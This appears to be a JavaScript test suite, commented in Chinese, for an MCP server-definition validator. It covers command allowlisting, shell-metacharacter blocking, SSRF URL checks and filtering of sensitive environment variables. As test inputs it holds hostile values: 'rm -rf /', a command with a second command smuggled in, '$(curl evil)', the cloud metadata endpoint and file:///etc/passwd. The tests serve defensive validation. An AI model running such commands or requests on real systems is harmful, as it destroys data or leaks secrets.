'use strict';

/*
 * MCP 安全校验测试：命令白名单、SSRF/内网 URL 限制、敏感环境变量过滤。
 */

const assert = require('assert');
const sec = require('../src/tools/mcpSecurity');

let pass = 0;
function ok(name, fn) {
  try { fn(); console.log('  ✓ ' + name); pass++; }
  catch (e) { console.error('  ✗ ' + name + ' -> ' + e.message); process.exitCode = 1; }
}

ok('默认放行 npx 命令', () => {
  const v = sec.validateServerDef({ id: 'x', command: 'npx', args: ['-y', '@x/y'] });
  assert.ok(v.ok, 'npx 应被放行，实际：' + v.errors.join('；'));
});

ok('拒绝白名单外的命令', () => {
  const v = sec.validateServerDef({ id: 'x', command: 'rm', args: ['-rf', '/'] });
  assert.ok(!v.ok, 'rm 应被拒绝');
  assert.ok(v.errors.some((e) => /白名单/.test(e)), '应提示白名单');
});

ok('命令含 shell 元字符被拦截', () => {
  const v = sec.validateServerDef({ id: 'x', command: 'npx; rm -rf /' });
  assert.ok(!v.ok);
});

ok('参数含 shell 元字符被拦截', () => {
  const v = sec.validateServerDef({ id: 'x', command: 'npx', args: ['$(curl evil)'] });
  assert.ok(!v.ok);
});

ok('显式 allowlist 可放行自定义命令', () => {
  const v = sec.validateServerDef({ id: 'x', command: 'my-mcp' }, { allowedCommands: ['my-mcp'] });
  assert.ok(v.ok, '应放行，实际：' + v.errors.join('；'));
});

ok('http 公网地址放行', () => {
  const v = sec.validateSseUrl('https://api.example.com/sse');
  assert.ok(v.ok);
});

ok('拒绝内网地址（SSRF 防护）', () => {
  for (const u of ['http://192.168.1.10/sse', 'http://10.0.0.5/sse', 'http://172.16.5.4/sse', 'http://localhost:8000/sse', 'http://169.254.169.254/latest/meta-data', 'http://127.0.0.1/sse']) {
    const v = sec.validateSseUrl(u);
    assert.ok(!v.ok, '应拒绝 ' + u + '，实际：' + JSON.stringify(v));
  }
});

ok('allowPrivateUrls 时放行内网', () => {
  const v = sec.validateSseUrl('http://192.168.1.10/sse', { allowPrivateUrls: true });
  assert.ok(v.ok);
});

ok('拒绝非 http(s) 协议', () => {
  assert.ok(!sec.validateSseUrl('file:///etc/passwd').ok);
  assert.ok(!sec.validateSseUrl('ftp://x').ok);
});

ok('敏感环境变量被剥离', () => {
  const out = sec.filterEnv({ NODE_ENV: 'dev', API_KEY: 'secret', PATH: '/bin' });
  assert.ok(!('API_KEY' in out), 'API_KEY 应被剥离');
  assert.ok('NODE_ENV' in out && 'PATH' in out, '普通变量应保留');
});

ok('显式 allow 可保留敏感变量', () => {
  const out = sec.filterEnv({ API_KEY: 'secret' }, ['API_KEY']);
  assert.ok('API_KEY' in out, 'allow 后应保留');
});

console.log('\nMCP 安全校验测试：' + pass + ' 通过');
